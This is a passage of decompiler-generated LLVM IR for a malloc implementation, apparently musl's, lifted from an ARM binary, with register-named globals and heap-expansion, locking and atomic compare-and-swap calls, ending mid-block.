  uselistorder i32 %v1_b5a8, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_b584, { 1, 0 }
  uselistorder i32 %v0_b56c, { 1, 0, 2 }
  uselistorder i32 %v1_b4dc, { 1, 0 }
  uselistorder i32 %v1_b4a8, { 0, 2, 1, 3 }
  uselistorder i32 %v3_b48c, { 2, 1, 0 }
  uselistorder i32 %v0_b48c, { 1, 0 }
  uselistorder i32 %v3_b47c, { 1, 0 }
  uselistorder i32 %v4_b464, { 2, 1, 0, 3 }
  uselistorder i32 %v0_b458, { 1, 0 }
  uselistorder i32 %stack_var_-44.2, { 1, 0 }
  uselistorder i32 %v2_b40c, { 1, 0, 2 }
  uselistorder i32 %v1_b408, { 0, 4, 1, 5, 3, 2, 6 }
  uselistorder i32 %v1_b400, { 1, 0 }
  uselistorder i32 %v3_b3fc, { 1, 2, 3, 0 }
  uselistorder i32 %v1_b3f8, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_b3ec, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 5, 8, 6, 7, 10, 9, 11, 18, 14, 15, 13, 12, 17, 16, 19, 20, 21, 22, 24, 23, 28, 25, 2, 3, 26, 27, 31, 29, 30, 34, 33, 32, 35, 36, 37, 38, 39, 40, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_23cf8.455 to i32), { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_b808, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b7dc, { 1, 0 }
  uselistorder label %dec_label_pc_b7ac, { 5, 2, 1, 3, 0, 4 }
  uselistorder label %dec_label_pc_b750, { 1, 0 }
  uselistorder label %dec_label_pc_b714, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_b674.dec_label_pc_b674_crit_edge, { 1, 0 }
  uselistorder label %bb68, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %dec_label_pc_b60c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b5d0, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_b584, { 1, 0 }
  uselistorder label %dec_label_pc_b584.preheader, { 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_b530, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_b4c0, { 1, 0 }
  uselistorder label %dec_label_pc_b484, { 2, 0, 1 }
  uselistorder label %bb62, { 1, 0 }
}

define i32 @malloc() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_b8e4 = load i32, i32* @r4, align 4
  %v6_b8e4 = load i32, i32* @r5, align 4
  %v9_b8e4 = load i32, i32* @r6, align 4
  %v12_b8e4 = load i32, i32* @r7, align 4
  %v15_b8e4 = load i32, i32* @r8, align 4
  %v18_b8e4 = load i32, i32* @sb, align 4
  %v21_b8e4 = load i32, i32* @sl, align 4
  %v24_b8e4 = load i32, i32* @fp, align 4
  store i32 2147479535, i32* %r3.global-to-local, align 4
  %v0_b8f0 = load i32, i32* @r0, align 4
  %v1_b8f0 = add i32 %v0_b8f0, -1
  %tmp = icmp ult i32 %v1_b8f0, 2147479536
  br i1 %tmp, label %dec_label_pc_bc90, label %dec_label_pc_b900

dec_label_pc_b900:                                ; preds = %entry
  %v2_b900 = icmp eq i32 %v0_b8f0, 0
  br i1 %v2_b900, label %.thread, label %dec_label_pc_bf68

.thread:                                          ; preds = %dec_label_pc_b900
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 0, i32* @sb, align 4
  br label %dec_label_pc_b914

dec_label_pc_b914:                                ; preds = %.thread44, %.thread, %dec_label_pc_bcb8
  %v1_b92c = phi i32 [ %v1_bcc8, %dec_label_pc_bcb8 ], [ 0, %.thread ], [ %v1_bca8, %.thread44 ]
  %v0_bcd4 = phi i32 [ %v1_bc94, %dec_label_pc_bcb8 ], [ 16, %.thread ], [ %v1_bc94, %.thread44 ]
  store i32 1, i32* %r2.global-to-local, align 4
  %v1_b918 = sub nsw i32 32, %v1_b92c
  store i32 %v1_b918, i32* %r1.global-to-local, align 4
  %v7_b920 = lshr i32 1, %v1_b918
  store i32 %v7_b920, i32* %r4.global-to-local, align 4
  %v1_b924 = add nsw i32 %v1_b92c, -32
  store i32 %v1_b924, i32* %r0.global-to-local, align 4
  %v6_b924 = icmp slt i32 %v1_b92c, 32
  br i1 %v6_b924, label %bb67, label %bb

bb:                                               ; preds = %dec_label_pc_b914
  %v7_b928 = shl i32 1, %v1_b924
  store i32 %v7_b928, i32* %r4.global-to-local, align 4
  br label %bb67

bb67:                                             ; preds = %dec_label_pc_b914, %bb
  %v0_b934 = phi i32 [ %v7_b920, %dec_label_pc_b914 ], [ %v7_b928, %bb ]
  %v1_b930 = shl i32 -1, %v1_b92c
  %v6_b934 = sub i32 -1, %v0_b934
  store i32 ptrtoint (i32* @global_var_238f0.447 to i32), i32* @sl, align 4
  store i32 ptrtoint (i8** @global_var_23e88.411 to i32), i32* @fp, align 4
  %v2_b94874 = load i32, i32* @global_var_238f0.447, align 4
  %v5_b94875 = load i32, i32* @global_var_238f4.449, align 4
  store i32 %v5_b94875, i32* @r4, align 4
  %v2_b95476 = and i32 %v2_b94874, %v1_b930
  store i32 %v2_b95476, i32* @r1, align 4
  %v2_b95877 = and i32 %v5_b94875, %v6_b934
  store i32 %v2_b95877, i32* %r2.global-to-local, align 4
  %v2_b95c78 = or i32 %v2_b95877, %v2_b95476
  store i32 %v2_b95c78, i32* %r3.global-to-local, align 4
  %v4_b95c80 = icmp eq i32 %v2_b95c78, 0
  br i1 %v4_b95c80, label %dec_label_pc_ba90, label %dec_label_pc_b964.preheader

dec_label_pc_b948.loopexit:                       ; preds = %dec_label_pc_ba14, %dec_label_pc_ba2c, %dec_label_pc_ba4c
  %v2_b948 = load i32, i32* @global_var_238f0.447, align 4
  %v5_b948 = load i32, i32* @global_var_238f4.449, align 4
  store i32 %v5_b948, i32* @r4, align 4
  %v2_b954 = and i32 %v2_b948, %v1_b930
  store i32 %v2_b954, i32* @r1, align 4
  %v2_b958 = and i32 %v5_b948, %v6_b934
  store i32 %v2_b958, i32* %r2.global-to-local, align 4
  %v2_b95c = or i32 %v2_b958, %v2_b954
  store i32 %v2_b95c, i32* %r3.global-to-local, align 4
  %v4_b95c = icmp eq i32 %v2_b95c, 0
  br i1 %v4_b95c, label %dec_label_pc_ba90, label %dec_label_pc_b964.preheader

dec_label_pc_b964.preheader:                      ; preds = %bb67, %dec_label_pc_b948.loopexit
  %v2_b95882 = phi i32 [ %v2_b958, %dec_label_pc_b948.loopexit ], [ %v2_b95877, %bb67 ]
  %v2_b95481 = phi i32 [ %v2_b954, %dec_label_pc_b948.loopexit ], [ %v2_b95476, %bb67 ]
  br label %dec_label_pc_b964

dec_label_pc_b964:                                ; preds = %dec_label_pc_b964.preheader, %dec_label_pc_ba68
  %v0_b96c = phi i32 [ %v2_ba84, %dec_label_pc_ba68 ], [ %v2_b95882, %dec_label_pc_b964.preheader ]
  %v0_bbe4 = phi i32 [ %v2_ba80, %dec_label_pc_ba68 ], [ %v2_b95481, %dec_label_pc_b964.preheader ]
  store i32 %v0_bbe4, i32* %r3.global-to-local, align 4
  %v2_b964 = icmp eq i32 %v0_bbe4, 0
  br i1 %v2_b964, label %dec_label_pc_b96c, label %dec_label_pc_bbe4

dec_label_pc_b96c:                                ; preds = %dec_label_pc_b964
  %v1_b96c = sub i32 0, %v0_b96c
  %v2_b970 = and i32 %v0_b96c, %v1_b96c
  store i32 %v2_b970, i32* %r0.global-to-local, align 4
  %v3_b980 = mul i32 %v2_b970, 1088
  store i32 %v3_b980, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19c46.463 to i32), i32* %r2.global-to-local, align 4
  %v2_b9b4 = mul i32 %v2_b970, 124511785
  store i32 %v2_b9b4, i32* %r3.global-to-local, align 4
  %v4_b9b8 = udiv i32 %v2_b9b4, 134217728
  %v5_b9b8 = add i32 %v4_b9b8, ptrtoint (i32* @global_var_19c46.463 to i32)
  %v6_b9b8 = inttoptr i32 %v5_b9b8 to i8*
  %v7_b9b8 = load i8, i8* %v6_b9b8, align 1
  %v9_b9b8 = zext i8 %v7_b9b8 to i32
  store i32 %v9_b9b8, i32* %r1.global-to-local, align 4
  %v1_b9bc = add nuw nsw i32 %v9_b9b8, 32
  br label %dec_label_pc_b9c0

dec_label_pc_b9c0:                                ; preds = %dec_label_pc_bbe4, %dec_label_pc_b96c
  %storemerge = phi i32 [ %v1_b9bc, %dec_label_pc_b96c ], [ %v9_bc30, %dec_label_pc_bbe4 ]
  store i32 %storemerge, i32* @r8, align 4
  %v3_b9c0 = load i32, i32* @global_var_23e94.445, align 4
  store i32 %v3_b9c0, i32* %r2.global-to-local, align 4
  %v3_b9c4 = mul nsw i32 %storemerge, 16
  store i32 %v3_b9c4, i32* @r6, align 4
  %v1_b9c8 = or i32 %v3_b9c4, 8
  store i32 %v1_b9c8, i32* %r3.global-to-local, align 4
  %v2_b9cc = icmp eq i32 %v3_b9c0, 0
  store i1 %v2_b9cc, i1* @cpsr_z, align 1
  %v1_b9d0 = load i32, i32* @sl, align 4
  %v2_b9d0 = add i32 %v1_b9d0, %v1_b9c8
  store i32 %v2_b9d0, i32* @r5, align 4
  br i1 %v2_b9cc, label %dec_label_pc_b9d8, label %dec_label_pc_bbbc

dec_label_pc_b9d8.loopexit:                       ; preds = %dec_label_pc_bbe0
  %v0_b9d8.pre = load i32, i32* @r8, align 4
  %v0_b9dc.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_b9d8

dec_label_pc_b9d8:                                ; preds = %dec_label_pc_b9d8.loopexit, %dec_label_pc_b9c0
  %v0_b9dc = phi i32 [ %v0_b9dc.pre, %dec_label_pc_b9d8.loopexit ], [ %v1_b9d0, %dec_label_pc_b9c0 ]
  %v0_bd00 = phi i32 [ %v0_b9d8.pre, %dec_label_pc_b9d8.loopexit ], [ %storemerge, %dec_label_pc_b9c0 ]
  %v1_b9d8 = add i32 %v0_bd00, 1
  store i32 %v1_b9d8, i32* %r1.global-to-local, align 4
  %v4_b9dc = mul i32 %v1_b9d8, 16
  %v5_b9dc = add i32 %v4_b9dc, %v0_b9dc
  %v6_b9dc = inttoptr i32 %v5_b9dc to i32*
  %v7_b9dc = load i32, i32* %v6_b9dc, align 4
  store i32 %v7_b9dc, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_238f0.447 to i32), i32* @r0, align 4
  %v2_b9e4 = icmp eq i32 %v7_b9dc, 0
  br i1 %v2_b9e4, label %.thread11, label %dec_label_pc_ba00

.thread11:                                        ; preds = %dec_label_pc_b9d8
  %v4_b9e8 = mul i32 %v1_b9d8, 16
  %v3_b9ec = add i32 %v4_b9e8, ptrtoint (i32* @global_var_238f0.447 to i32)
  store i32 %v3_b9ec, i32* %r3.global-to-local, align 4
  %v2_b9f0 = add i32 %v4_b9e8, add (i32 ptrtoint (i32* @global_var_238f0.447 to i32), i32 -8)
  store i32 %v2_b9f0, i32* %r2.global-to-local, align 4
  %v7_b9f4 = add i32 %v4_b9dc, ptrtoint (i32* @global_var_238f0.447 to i32)
  %v8_b9f4 = inttoptr i32 %v7_b9f4 to i32*
  store i32 %v2_b9f0, i32* %v8_b9f4, align 4
  %v1_b9f8 = load i32, i32* %r2.global-to-local, align 4
  %v2_b9f8 = load i32, i32* %r3.global-to-local, align 4
  %v3_b9f8 = add i32 %v2_b9f8, 4
  %v4_b9f8 = inttoptr i32 %v3_b9f8 to i32*
  store i32 %v1_b9f8, i32* %v4_b9f8, align 4
  %v1_ba18.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_ba14

dec_label_pc_ba00:                                ; preds = %dec_label_pc_b9d8
  %v1_ba08 = add i32 %v4_b9dc, add (i32 ptrtoint (i32* @global_var_238f0.447 to i32), i32 -8)
  store i32 %v1_ba08, i32* %r3.global-to-local, align 4
  %v9_ba0c = icmp eq i32 %v7_b9dc, %v1_ba08
  br i1 %v9_ba0c, label %dec_label_pc_ba14, label %dec_label_pc_bd00

dec_label_pc_ba14:                                ; preds = %.thread11, %dec_label_pc_ba00
  %v1_ba18 = phi i32 [ %v1_ba18.pre, %.thread11 ], [ %v0_b9dc, %dec_label_pc_ba00 ]
  %v0_ba14 = load i32, i32* @r6, align 4
  %v1_ba14 = add i32 %v0_ba14, 8
  store i32 %v1_ba14, i32* @r2, align 4
  %v2_ba18 = add i32 %v1_ba18, %v1_ba14
  %v3_ba18 = inttoptr i32 %v2_ba18 to i32*
  %v4_ba18 = load i32, i32* %v3_ba18, align 4
  store i32 %v4_ba18, i32* %r3.global-to-local, align 4
  %v2_ba1c = icmp eq i32 %v4_ba18, 0
  store i1 %v2_ba1c, i1* @cpsr_z, align 1
  store i32 ptrtoint (i32* @global_var_238f0.447 to i32), i32* @r1, align 4
  store i32 %v2_ba18, i32* @r4, align 4
  br i1 %v2_ba1c, label %dec_label_pc_b948.loopexit, label %dec_label_pc_ba2c

dec_label_pc_ba2c:                                ; preds = %dec_label_pc_ba14
  %v0_ba2c = call i32 @__a_barrier()
  store i32 %v0_ba2c, i32* @r0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_ba34 = load i32, i32* @r2, align 4
  %v2_ba34 = load i32, i32* @r1, align 4
  %v3_ba34 = add i32 %v2_ba34, %v1_ba34
  %v4_ba34 = inttoptr i32 %v3_ba34 to i32*
  store i32 0, i32* %v4_ba34, align 4
  %v0_ba38 = call i32 @__a_barrier()
  store i32 %v0_ba38, i32* %r0.global-to-local, align 4
  %v0_ba3c = load i32, i32* @r6, align 4
  %v1_ba3c = add i32 %v0_ba3c, 12
  store i32 %v1_ba3c, i32* %r3.global-to-local, align 4
  %v1_ba40 = load i32, i32* @r1, align 4
  %v2_ba40 = add i32 %v1_ba40, %v1_ba3c
  %v3_ba40 = inttoptr i32 %v2_ba40 to i32*
  %v4_ba40 = load i32, i32* %v3_ba40, align 4
  store i32 %v4_ba40, i32* %r2.global-to-local, align 4
  %v2_ba44 = icmp eq i32 %v4_ba40, 0
  br i1 %v2_ba44, label %dec_label_pc_b948.loopexit, label %dec_label_pc_ba4c

dec_label_pc_ba4c:                                ; preds = %dec_label_pc_ba2c
  store i32 240, i32* @r7, align 4
  %v0_ba50 = load i32, i32* @r4, align 4
  store i32 %v0_ba50, i32* %r0.global-to-local, align 4
  store i32 129, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_ba64 = icmp eq i32 %v0_ba50, -38
  br i1 %v4_ba64, label %dec_label_pc_ba68, label %dec_label_pc_b948.loopexit

dec_label_pc_ba68:                                ; preds = %dec_label_pc_ba4c
  store i32 -38, i32* %r0.global-to-local, align 4
  %v2_ba74 = load i32, i32* @global_var_238f0.447, align 4
  %v5_ba74 = load i32, i32* @global_var_238f4.449, align 4
  store i32 %v5_ba74, i32* @r4, align 4
  %v2_ba80 = and i32 %v2_ba74, %v1_b930
  store i32 %v2_ba80, i32* @r1, align 4
  %v2_ba84 = and i32 %v5_ba74, %v6_b934
  store i32 %v2_ba84, i32* %r2.global-to-local, align 4
  %v2_ba88 = or i32 %v2_ba84, %v2_ba80
  store i32 %v2_ba88, i32* %r3.global-to-local, align 4
  %v4_ba88 = icmp eq i32 %v2_ba88, 0
  br i1 %v4_ba88, label %dec_label_pc_ba90, label %dec_label_pc_b964

dec_label_pc_ba90:                                ; preds = %bb67, %dec_label_pc_b948.loopexit, %dec_label_pc_ba68
  %v3_ba90 = load i32, i32* @global_var_23e94.445, align 4
  store i32 %v3_ba90, i32* %r3.global-to-local, align 4
  store i32 %v0_bcd4, i32* %ip.global-to-local, align 4
  %v2_ba98 = icmp eq i32 %v3_ba90, 0
  store i1 %v2_ba98, i1* @cpsr_z, align 1
  %v1_ba9c = add i32 %v0_bcd4, 16
  store i32 %v1_ba9c, i32* %r2.global-to-local, align 4
  store i32 %v1_ba9c, i32* %stack_var_-44, align 4
  store i32 ptrtoint (i32* @global_var_238e4.465 to i32), i32* @r6, align 4
  br i1 %v2_ba98, label %dec_label_pc_baac, label %dec_label_pc_bc54

dec_label_pc_baac:                                ; preds = %dec_label_pc_bc38, %dec_label_pc_ba90
  %v2_baac = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_baac, i32* %r0.global-to-local, align 4
  %v2_bab0 = call i32 @__expand_heap(i32* nonnull %stack_var_-44)
  store i32 %v2_bab0, i32* @r0, align 4
  store i32 %v2_bab0, i32* @r4, align 4
  %v2_bab4 = icmp eq i32 %v2_bab0, 0
  br i1 %v2_bab4, label %dec_label_pc_be44, label %dec_label_pc_babc

dec_label_pc_babc:                                ; preds = %dec_label_pc_baac
  store i32 ptrtoint (i32* @global_var_238e0.467 to i32), i32* @r0, align 4
  %v2_bac0 = load i32, i32* @global_var_238e0.467, align 4
  store i32 %v2_bac0, i32* %r3.global-to-local, align 4
  %v9_bac4 = icmp eq i32 %v2_bab0, %v2_bac0
  br i1 %v9_bac4, label %dec_label_pc_bae4, label %dec_label_pc_bacc

dec_label_pc_bacc:                                ; preds = %dec_label_pc_babc
  %v3_bacc = load i32, i32* %stack_var_-44, align 4
  %v1_bad0 = add i32 %v2_bab0, 16
  store i32 %v1_bad0, i32* %r4.global-to-local, align 4
  %v1_bad4 = add i32 %v3_bacc, -16
  store i32 %v1_bad4, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 %v1_bad4, i32* %stack_var_-44, align 4
  %v2_bae0 = add i32 %v2_bab0, 8
  %v3_bae0 = inttoptr i32 %v2_bae0 to i32*
  store i32 1, i32* %v3_bae0, align 4
  %v0_bae8.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_bae4

dec_label_pc_bae4:                                ; preds = %dec_label_pc_babc, %dec_label_pc_bacc
  %v0_bae8 = phi i32 [ %v2_bab0, %dec_label_pc_babc ], [ %v0_bae8.pre, %dec_label_pc_bacc ]
  %v3_bae4 = load i32, i32* %stack_var_-44, align 4
  %v1_bae8 = add i32 %v0_bae8, -8
  store i32 %v1_bae8, i32* @r5, align 4
  %v1_baec = or i32 %v3_bae4, 1
  store i32 %v1_baec, i32* @r1, align 4
  %v2_baf0 = add i32 %v3_bae4, %v0_bae8
  store i32 %v2_baf0, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r4, align 4
  %v1_baf8 = add i32 %v2_baf0, -8
  %v2_baf8 = inttoptr i32 %v1_baf8 to i32*
  store i32 %v1_baec, i32* %v2_baf8, align 4
  %v4_baf8 = add i32 %v2_baf0, -4
  %v5_baf8 = inttoptr i32 %v4_baf8 to i32*
  %v6_baf8 = load i32, i32* @r4, align 4
  store i32 %v6_baf8, i32* %v5_baf8, align 4
  %v0_bafc = load i32, i32* @r1, align 4
  %v1_bafc = load i32, i32* @r5, align 4
  %v2_bafc = add i32 %v1_bafc, 4
  %v3_bafc = inttoptr i32 %v2_bafc to i32*
  store i32 %v0_bafc, i32* %v3_bafc, align 4
  %v2_bb00 = load i32, i32* @global_var_238e4.465, align 4
  store i32 %v2_bb00, i32* %r2.global-to-local, align 4
  %v2_bb04 = icmp eq i32 %v2_bb00, 0
  store i1 %v2_bb04, i1* @cpsr_z, align 1
  %v0_bb08 = load i32, i32* %r3.global-to-local, align 4
  %v1_bb08 = load i32, i32* @r0, align 4
  %v2_bb08 = inttoptr i32 %v1_bb08 to i32*
  store i32 %v0_bb08, i32* %v2_bb08, align 4
  br i1 %v2_bb04, label %dec_label_pc_bb2c, label %dec_label_pc_bb10

dec_label_pc_bb10:                                ; preds = %dec_label_pc_bae4
  %v0_bb10 = call i32 @__a_barrier()
  store i32 %v0_bb10, i32* @r0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_bb18 = load i32, i32* @r6, align 4
  %v2_bb18 = inttoptr i32 %v1_bb18 to i32*
  store i32 0, i32* %v2_bb18, align 4
  %v0_bb1c = call i32 @__a_barrier()
  store i32 %v0_bb1c, i32* %r0.global-to-local, align 4
  %v3_bb20 = load i32, i32* @global_var_238e8.468, align 4
  store i32 %v3_bb20, i32* %r3.global-to-local, align 4
  %v2_bb24 = icmp eq i32 %v3_bb20, 0
  br i1 %v2_bb24, label %dec_label_pc_bb2c, label %dec_label_pc_bdf4

dec_label_pc_bb2c:                                ; preds = %dec_label_pc_bb10, %dec_label_pc_bdf4, %dec_label_pc_bae4, %dec_label_pc_be10
  %v0_bb2c = load i32, i32* @r5, align 4
  store i32 %v0_bb2c, i32* %r0.global-to-local, align 4
  %v1_bb30 = inttoptr i32 %v0_bb2c to i32*
  %v2_bb30 = call i32 @alloc_rev(i32* %v1_bb30)
  store i32 %v2_bb30, i32* %r0.global-to-local, align 4
  %v2_bb34 = icmp eq i32 %v2_bb30, 0
  %v1_bb38 = load i32, i32* @r5, align 4
  br i1 %v2_bb34, label %bb68, label %dec_label_pc_bb40

bb68:                                             ; preds = %dec_label_pc_bb2c
  store i32 %v1_bb38, i32* @r8, align 4
  br label %dec_label_pc_bb70

dec_label_pc_bb40:                                ; preds = %dec_label_pc_bb2c
  %v1_bb40 = inttoptr i32 %v1_bb38 to i32*
  %v2_bb40 = load i32, i32* %v1_bb40, align 4
  %v1_bb44 = and i32 %v2_bb40, -2
  %v2_bb48 = sub i32 %v1_bb38, %v1_bb44
  store i32 %v2_bb48, i32* %r3.global-to-local, align 4
  %v1_bb4c = add i32 %v2_bb48, 4
  %v2_bb4c = inttoptr i32 %v1_bb4c to i32*
  %v3_bb4c = load i32, i32* %v2_bb4c, align 4
  store i32 %v3_bb4c, i32* %r1.global-to-local, align 4
  %v1_bb50 = add i32 %v1_bb38, 4
  %v2_bb50 = inttoptr i32 %v1_bb50 to i32*
  %v3_bb50 = load i32, i32* %v2_bb50, align 4
  store i32 %v3_bb50, i32* %r2.global-to-local, align 4
  %v1_bb54 = and i32 %v3_bb4c, -2
  %v2_bb58 = add i32 %v3_bb50, %v1_bb54
  store i32 %v2_bb58, i32* %r1.global-to-local, align 4
  store i32 %v2_bb58, i32* %v2_bb4c, align 4
  %v0_bb60 = load i32, i32* %r2.global-to-local, align 4
  %v1_bb60 = and i32 %v0_bb60, -2
  store i32 %v1_bb60, i32* %r2.global-to-local, align 4
  %v0_bb64 = load i32, i32* %r1.global-to-local, align 4
  %v1_bb64 = load i32, i32* @r5, align 4
  %v3_bb64 = add i32 %v1_bb64, %v1_bb60
  %v4_bb64 = inttoptr i32 %v3_bb64 to i32*
  store i32 %v0_bb64, i32* %v4_bb64, align 4
  %v0_bb68 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_bb68, i32* @r8, align 4
  store i32 %v0_bb68, i32* @r5, align 4
  br label %dec_label_pc_bb70

dec_label_pc_bb70:                                ; preds = %bb68, %dec_label_pc_bdc8, %dec_label_pc_bda8, %dec_label_pc_bd90, %dec_label_pc_bde4, %dec_label_pc_bb40
  %v0_bb70 = load i32, i32* @r5, align 4
  %v1_bb70 = add i32 %v0_bb70, 4
  %v2_bb70 = inttoptr i32 %v1_bb70 to i32*
  %v3_bb70 = load i32, i32* %v2_bb70, align 4
  %v1_bb74 = and i32 %v3_bb70, -2
  store i32 %v1_bb74, i32* %r1.global-to-local, align 4
  store i32 %v0_bcd4, i32* @r3, align 4
  %v1_bb7c = add i32 %v1_bb74, -16
  %v3_bb80 = icmp ult i32 %v0_bcd4, %v1_bb7c
  br i1 %v3_bb80, label %dec_label_pc_bcd0, label %dec_label_pc_bb88

dec_label_pc_bb88:                                ; preds = %dec_label_pc_bb70, %dec_label_pc_bcd0
  %v0_bb88 = load i32, i32* @r8, align 4
  %v1_bb88 = add i32 %v0_bb88, 8
  store i32 %v1_bb88, i32* @ip, align 4
  br label %dec_label_pc_bb8c

dec_label_pc_bb8c:                                ; preds = %.thread18, %dec_label_pc_bfb0, %dec_label_pc_bf68, %dec_label_pc_be50, %dec_label_pc_bb88
  %v0_bb8c = load i32, i32* @ip, align 4
  store i32 %v0_bb8c, i32* %r0.global-to-local, align 4
  store i32 %v3_b8e4, i32* @r4, align 4
  store i32 %v6_b8e4, i32* @r5, align 4
  store i32 %v9_b8e4, i32* @r6, align 4
  store i32 %v12_b8e4, i32* @r7, align 4
  store i32 %v15_b8e4, i32* @r8, align 4
  store i32 %v18_b8e4, i32* @sb, align 4
  store i32 %v21_b8e4, i32* @sl, align 4
  store i32 %v24_b8e4, i32* @fp, align 4
  ret i32 %v0_bb8c

dec_label_pc_bba4:                                ; preds = %dec_label_pc_bbe0
  %v0_bba4 = load i32, i32* @r6, align 4
  %v1_bba4 = add i32 %v0_bba4, 12
  store i32 1, i32* @r2, align 4
  %v1_bbac = load i32, i32* @sl, align 4
  %v2_bbac = add i32 %v1_bba4, %v1_bbac
  store i32 %v2_bbac, i32* %r1.global-to-local, align 4
  %v0_bbb0 = load i32, i32* @r5, align 4
  store i32 %v0_bbb0, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v2_bbb8 = inttoptr i32 %v0_bbb0 to i32*
  %v3_bbb8 = call i32 @__wait(i32* %v2_bbb8, i32 %v2_bbac)
  store i32 %v3_bbb8, i32* %r0.global-to-local, align 4
  %v0_bbbc.pre = load i32, i32* @r6, align 4
  %v1_bbc0.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_bbbc

dec_label_pc_bbbc:                                ; preds = %dec_label_pc_b9c0, %dec_label_pc_bba4
  %v1_bbc0 = phi i32 [ %v1_bbc0.pre, %dec_label_pc_bba4 ], [ %v1_b9d0, %dec_label_pc_b9c0 ]
  %v0_bbbc = phi i32 [ %v0_bbbc.pre, %dec_label_pc_bba4 ], [ %v3_b9c4, %dec_label_pc_b9c0 ]
  %v1_bbbc = add i32 %v0_bbbc, 8
  store i32 %v1_bbbc, i32* %r3.global-to-local, align 4
  %v2_bbc0 = add i32 %v1_bbbc, %v1_bbc0
  store i32 %v2_bbc0, i32* @r4, align 4
  br label %dec_label_pc_bbc4

dec_label_pc_bbc4:                                ; preds = %dec_label_pc_bbc4.dec_label_pc_bbc4_crit_edge, %dec_label_pc_bbbc
  %v0_bbc4 = phi i32 [ %v0_bbc4.pre, %dec_label_pc_bbc4.dec_label_pc_bbc4_crit_edge ], [ %v2_bbc0, %dec_label_pc_bbbc ]
  %v1_bbc4 = inttoptr i32 %v0_bbc4 to i32*
  %v2_bbc4 = load i32, i32* %v1_bbc4, align 4
  store i32 %v2_bbc4, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_bbc4, i32* %r0.global-to-local, align 4
  store i32 %v0_bbc4, i32* @r2, align 4
  %v3_bbd4 = call i32 @__a_cas(i32 %v2_bbc4, i32 1, i32 %v0_bbc4)
  store i32 %v3_bbd4, i32* %r0.global-to-local, align 4
  %v2_bbd8 = icmp eq i32 %v3_bbd4, 0
  store i1 %v2_bbd8, i1* @cpsr_z, align 1
  br i1 %v2_bbd8, label %dec_label_pc_bbe0, label %dec_label_pc_bbc4.dec_label_pc_bbc4_crit_edge

dec_label_pc_bbc4.dec_label_pc_bbc4_crit_edge:    ; preds = %dec_label_pc_bbc4
  %v0_bbc4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bbc4

dec_label_pc_bbe0:                                ; preds = %dec_label_pc_bbc4
  %v0_bb9c = load i32, i32* @r7, align 4
  %v2_bb9c = icmp eq i32 %v0_bb9c, 0
  br i1 %v2_bb9c, label %dec_label_pc_b9d8.loopexit, label %dec_label_pc_bba4

dec_label_pc_bbe4:                                ; preds = %dec_label_pc_b964
  %v1_bbe4 = sub i32 0, %v0_bbe4
  %v2_bbe8 = and i32 %v0_bbe4, %v1_bbe4
  store i32 %v2_bbe8, i32* %r0.global-to-local, align 4
  %v3_bbf8 = mul i32 %v2_bbe8, 1088
  store i32 %v3_bbf8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19c46.463 to i32), i32* %r3.global-to-local, align 4
  %v2_bc2c = mul i32 %v2_bbe8, 124511785
  store i32 %v2_bc2c, i32* %r2.global-to-local, align 4
  %v4_bc30 = udiv i32 %v2_bc2c, 134217728
  %v5_bc30 = add i32 %v4_bc30, ptrtoint (i32* @global_var_19c46.463 to i32)
  %v6_bc30 = inttoptr i32 %v5_bc30 to i8*
  %v7_bc30 = load i8, i8* %v6_bc30, align 1
  %v9_bc30 = zext i8 %v7_bc30 to i32
  br label %dec_label_pc_b9c0

dec_label_pc_bc38:                                ; preds = %dec_label_pc_bc70, %dec_label_pc_bc54
  store i32 ptrtoint (i32* @global_var_238e4.465 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* @r2, align 4
  %v0_bc40 = load i32, i32* @r4, align 4
  %v2_bc40 = icmp eq i32 %v0_bc40, 0
  store i32 ptrtoint (i32* @global_var_238e8.468 to i32), i32* @r1, align 4
  store i32 1, i32* @r3, align 4
  br i1 %v2_bc40, label %dec_label_pc_baac, label %dec_label_pc_bc50

dec_label_pc_bc50:                                ; preds = %dec_label_pc_bc38
  %v3_bc50 = call i32 @__wait(i32* nonnull @global_var_238e4.465, i32 ptrtoint (i32* @global_var_238e8.468 to i32))
  store i32 %v3_bc50, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bc54

dec_label_pc_bc54:                                ; preds = %dec_label_pc_bc70, %dec_label_pc_bc50, %dec_label_pc_ba90
  %v2_bc54 = load i32, i32* @global_var_238e4.465, align 4
  store i32 %v2_bc54, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
